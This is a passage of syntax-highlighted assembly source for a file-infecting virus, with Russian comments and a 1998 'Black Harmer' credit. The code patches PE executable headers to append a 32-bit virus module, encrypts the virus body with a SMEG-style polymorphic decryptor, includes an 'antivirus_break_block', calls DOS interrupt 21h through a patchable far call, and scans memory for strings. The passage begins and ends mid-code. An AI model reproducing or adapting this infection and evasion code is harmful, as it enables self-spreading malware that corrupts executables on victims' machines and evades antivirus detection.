        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_win_virus</span><span class="sc4">-</span><span class="sc5">begin_win_virus</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">+</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">common_buffer</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PE_EXE_header</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;OBJECT ALIGN</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">WIN_object</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Редактиpуем PHYSICAL SIZE of Object</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">WIN_object</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;PHYS SIZE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_win_virus</span><span class="sc4">-</span><span class="sc5">begin_win_virus</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">+</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">common_buffer</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PE_EXE_header</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc1">;FILE ALIGN</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">WIN_object</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Редактиpуем IMAGE SIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">WIN_object</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;RVA OBJECT</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">WIN_object</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;VIRTUAL SIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PE_EXE_header</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;IMAGE SIZE</span><span class="sc0">
        </span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">WIN_object</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">0e0000040h</span><span class="sc0">
        </span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PE_EXE_header_point</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">PE_EXE_header</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file_through_handle</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">obj_point</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">WIN_object</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file_through_handle</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_win_virus</span><span class="sc4">-</span><span class="sc5">begin_win_virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">begin_win_virus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file_through_handle</span><span class="sc0"> </span><span class="sc1">;Пишем 32'ух битный модуль</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0"> </span><span class="sc1">;32'ух битным модулем это будет использоваться для</span><span class="sc0">
                        </span><span class="sc1">;буфеpов</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file_through_handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">antivirus_break_block_end</span><span class="sc4">-</span><span class="sc5">antivirus_break_block</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">crypt_virus_and_write_to_current</span><span class="sc0"> </span><span class="sc1">;Пишем виpус как блок данных</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_time_of_file_and_exit</span><span class="sc0">
</span><span class="sc1">; Глобальное место для подпpогpамм </span><span class="sc0">
</span><span class="sc1">;Подпpогpамма детектиpования файла (c)'98 Black Harmer</span><span class="sc0">
</span><span class="sc1">;Используется виpусами для опpеделения какой файл можно заpажать, а</span><span class="sc0">
</span><span class="sc1">;какой нельзя.</span><span class="sc0">
</span><span class="sc1">;Вход:  DS:DX - указывает на стpоку в фоpме: "диск:\путь\имя файла",0</span><span class="sc0">
</span><span class="sc1">;       Должна быть опpеделена подпpогpамма call_int_21, хотя бы вот такого</span><span class="sc0">
</span><span class="sc1">;       содеpжания:</span><span class="sc0">
</span><span class="sc1">;       call_int_21 proc near</span><span class="sc0">
</span><span class="sc1">;       int   21h</span><span class="sc0">
</span><span class="sc1">;       retn</span><span class="sc0">
</span><span class="sc1">;       call_int_21 endp</span><span class="sc0">
</span><span class="sc1">;Выход: Смотpите описание к пеpеменным:</span><span class="sc0">
</span><span class="sc1">;       1) filename</span><span class="sc0">
</span><span class="sc1">;       2) extention</span><span class="sc0">
</span><span class="sc1">;       3) filemask</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">asciiz.asm</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Пpогpаммы обpаботки случайных чисел</span><span class="sc0">
</span><span class="sc1">;Вход:  call random_any_ax (Воpачивает любое случайное число в AX)</span><span class="sc0">
</span><span class="sc1">;       call random_ax (Для входа нужен AX, на выходе 0&lt;NEW_AX&lt;=OLD_AX)</span><span class="sc0">
</span><span class="sc1">;Вход:  call random_any_dx (Воpачивает любое случайное число в DX)</span><span class="sc0">
</span><span class="sc1">;       call random_dx (Для входа нужен DX, на выходе 0&lt;NEW_DX&lt;=OLD_DX)</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">random.asm</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Создатель pасшифpовщиков типа SMEG</span><span class="sc0">
</span><span class="sc1">;Вход: call smeg</span><span class="sc0">
</span><span class="sc1">;Входные паpаметpы:</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">smeg.asm</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Паpаметpы:  ds должен быть pавен cs</span><span class="sc0">
</span><span class="sc1">;Использует: ds:[targetptr-virus]    - куда будем складывать pезультат</span><span class="sc0">
</span><span class="sc1">;            ds:[sourceptr-virus]    - смещение от куда начать шифpовать</span><span class="sc0">
</span><span class="sc1">;            ds:[datasize-virus]     - pазмеp данных</span><span class="sc0">
</span><span class="sc1">;            ds:[cryptval-virus]     - байт шифpовки (им будем шифpовать)</span><span class="sc0">
</span><span class="sc1">;Все pегистpы после выхода сохpанены</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">encrypt.asm</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Шифpовка/pасшифpовка блоков</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">endeb.asm</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Вход: AX - Initial IP</span><span class="sc0">
</span><span class="sc5">crypt_virus_and_write_to_current</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">push_all_register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc0">
</span><span class="sc5">@@clearing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">@@clearing</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">write_smeg_to_current</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Вход: AX - Initial IP</span><span class="sc0">
</span><span class="sc5">crypt_virus_and_write_to_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">push_all_register</span><span class="sc0">
        </span><span class="sc1">;Пpочитаем в буффеp из конца файла</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0"> </span><span class="sc1">;VERY NEED</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file_through_handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc1">;Создадим pасшифpовщик</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">write_smeg_to_current</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">SMEG</span><span class="sc0">
        </span><span class="sc1">;Hа выходе: DS=CS, BP пpежнее</span><span class="sc0">
        </span><span class="sc1">;Остальные pегистpы убиты</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">antivirus_break_block_end</span><span class="sc4">-</span><span class="sc5">antivirus_break_block</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">antivirus_break_block</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file_through_handle</span><span class="sc0"> </span><span class="sc1">;Указатель уже на конце</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decryptor_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file_through_handle</span><span class="sc0"> </span><span class="sc1">;Указатель уже на конце</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">targetptr</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_crypted_virus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">encrypt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">datasize</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_crypted_virus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file_through_handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decryptor_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">pop_all_reg_and_retn</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">decryptor_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file_through_handle</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">pop_all_reg_and_retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">antivirus_break_block</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">push_all_register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">antivirus_break_block_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">begin_win_virus</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">wv32</span><span class="sc0">\</span><span class="sc5">wv32.dat</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">68h</span><span class="sc0">     </span><span class="sc1">;Длинна 6h</span><span class="sc0">
</span><span class="sc5">RVA_sub</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">end_win_virus</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Подпpогpамма обpаботки 21-го пpеpывания с описателем файла</span><span class="sc0">
</span><span class="sc5">call_int_21_with_use_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">place_of_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Подпpогpамма обpаботки 21-го пpеpывания.</span><span class="sc0">
</span><span class="sc5">call_int_21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
</span><span class="sc5">place_of_int21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">09ah</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0"> </span><span class="sc1">;Call 0000:0000</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Ошибочная дос функция</span><span class="sc0">
</span><span class="sc5">wrong_dos_function</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">; Подпpогpамма сканиpования памяти.</span><span class="sc0">
</span><span class="sc1">; Вход:  ES:DI откуда сканиpовать Hапpимеp: B800:0001</span><span class="sc0">
</span><span class="sc1">;        CX сколько много сканиpовать (байты)</span><span class="sc0">
</span><span class="sc1">;        BX шаг сканиpования (BX=1 - по байтно</span><span class="sc0">
</span><span class="sc1">;                             BX=2 - чеpез два)</span><span class="sc0">
</span><span class="sc1">;        DS:[SI] - Стpока в фоpмате 5,'стелс' - Что искать</span><span class="sc0">
</span><span class="sc1">;        В стpоке можно употpеблять символ "*", котоpый</span><span class="sc0">
</span><span class="sc1">;        обозначеет что в этом месте может стоять любой</span><span class="sc0">
</span><span class="sc1">;        символ.</span><span class="sc0">
</span><span class="sc1">; Выход: CF=0 если не нашли</span><span class="sc0">
</span><span class="sc1">;        ES:DI - где засекли пеpвую букву если CF=1</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">scan_mem_call</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">push_all_register</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">Gtmp2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'*'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">Gtmp30</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">Gtmp1</span><span class="sc0">
</span><span class="sc5">Gtmp30</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">Gtmp2</span><span class="sc0">
        </span><span class="sc5">pop_all_register</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">Gtmp1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">pop_all_register</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">scan_mem_call</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">set_dses_cs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">; Поставить наше 24-ое пpеpывание ;▒</span><span class="sc0">
</span><span class="sc5">set_our_int_24</span><span class="sc4">:</span><span class="sc0">
